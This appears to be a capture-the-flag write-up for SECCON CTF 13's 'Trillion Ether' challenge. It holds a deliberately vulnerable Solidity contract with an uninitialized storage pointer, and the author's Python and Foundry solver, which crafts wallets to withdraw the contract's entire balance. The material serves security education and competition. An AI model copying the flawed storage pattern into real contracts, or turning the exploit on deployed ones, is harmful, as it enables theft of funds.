---
title: "Trillion Ether - Seccon CTF 13 Quals"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "solidity", "foundry", "proof-of-work", "subprocess", "blockchain", "seccon-ctf-13-quals"]
summary: "Trillion Ether is a warmup blockchain challenge created for SECCON CTF 13 Quals."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/trillion-ether"
license: "none stated"
ctf:
  name: "Seccon CTF 13 Quals"
  challenge: "Trillion Ether"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/trillion-ether>
- **CTF:** Seccon CTF 13 Quals

---

# Trillion Ether

**Trillion Ether** is a warmup blockchain challenge created for SECCON CTF 13 Quals.

This directory includes:
- `build`: the challenge server based on [my previous challenge](../../hitcon-ctf-2024-quals/lustrous/).
- `files`: the distributed files for players
- `solver`: the author's solver

Solves: 35 / 653 teams in 24h.

## Description

Get Chance!

```
nc trillion-ether.seccon.games 31337
```

## Contract

The challenge contract is [TrillionEther.sol](build/src/contracts/src/TrillionEther.sol):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract TrillionEther {
    struct Wallet {
        bytes32 name;
        uint256 balance;
        address owner;
    }

    Wallet[] public wallets;

    constructor() payable {
        require(msg.value == 1_000_000_000_000 ether);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }

    function createWallet(bytes32 name) external payable {
        wallets.push(_newWallet(name, msg.value, msg.sender));
    }

    function transfer(uint256 fromWalletId, uint256 toWalletId, uint256 amount) external {
        require(wallets[fromWalletId].owner == msg.sender, "not owner");
        wallets[fromWalletId].balance -= amount;
        wallets[toWalletId].balance += amount;
    }

    function withdraw(uint256 walletId, uint256 amount) external {
        require(wallets[walletId].owner == msg.sender, "not owner");
        wallets[walletId].balance -= amount;
        payable(wallets[walletId].owner).transfer(amount);
    }

    function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
        wallet = wallet;
        wallet.name = name;
        wallet.balance = balance;
        wallet.owner = owner;
    }
}
```

## Writeup

-> [solver/README.md](solver/README.md)

## Launch a challenge server

```
make start-challenge-server-local
```

## Access the challenge server

```
nc localhost 31337
```

Good luck!

## Run the author's solver

```
make run-solver-local
```


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/trillion-ether/solver/solve.py>

```python
import hashlib
import os
import subprocess

from pwn import remote

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
challenge_addr = r.recvline().strip().decode()
r.close()

res = subprocess.run(
    [
        "forge",
        "script",
        "ExploitScript",
        "--sig",
        "run(address)",
        challenge_addr,
        "--private-key",
        private_key,
        "--broadcast",
        "--rpc-url",
        rpc_url,
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0, res.stderr

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
```


## Solver: `Exploit.s.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/trillion-ether/solver/script/Exploit.s.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {TrillionEther} from "../src/TrillionEther.sol";

// forge script script/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY -vvvvv --broadcast

contract ExploitScript is Script {
    function run(address trillionEtherAddr) public {
        vm.startBroadcast();
        TrillionEther trillionEther = TrillionEther(trillionEtherAddr);
        trillionEther.createWallet("");
        trillionEther.createWallet(bytes32(type(uint256).max / uint256(3)));
        trillionEther.withdraw(0, 1_000_000_000_000 ether);
        require(trillionEther.isSolved());
        vm.stopBroadcast();
    }
}
```


## Solver: `TrillionEther.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-13-quals/trillion-ether/solver/src/TrillionEther.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

contract TrillionEther {
    struct Wallet {
        bytes32 name;
        uint256 balance;
        address owner;
    }

    Wallet[] public wallets;

    constructor() payable {
        require(msg.value == 1_000_000_000_000 ether);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }

    function createWallet(bytes32 name) external payable {
        wallets.push(_newWallet(name, msg.value, msg.sender));
    }

    function transfer(uint256 fromWalletId, uint256 toWalletId, uint256 amount) external {
        require(wallets[fromWalletId].owner == msg.sender, "not owner");
        wallets[fromWalletId].balance -= amount;
        wallets[toWalletId].balance += amount;
    }

    function withdraw(uint256 walletId, uint256 amount) external {
        require(wallets[walletId].owner == msg.sender, "not owner");
        wallets[walletId].balance -= amount;
        payable(wallets[walletId].owner).transfer(amount);
    }

    function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
        wallet = wallet;
        wallet.name = name;
        wallet.balance = balance;
        wallet.owner = owner;
    }
}
```
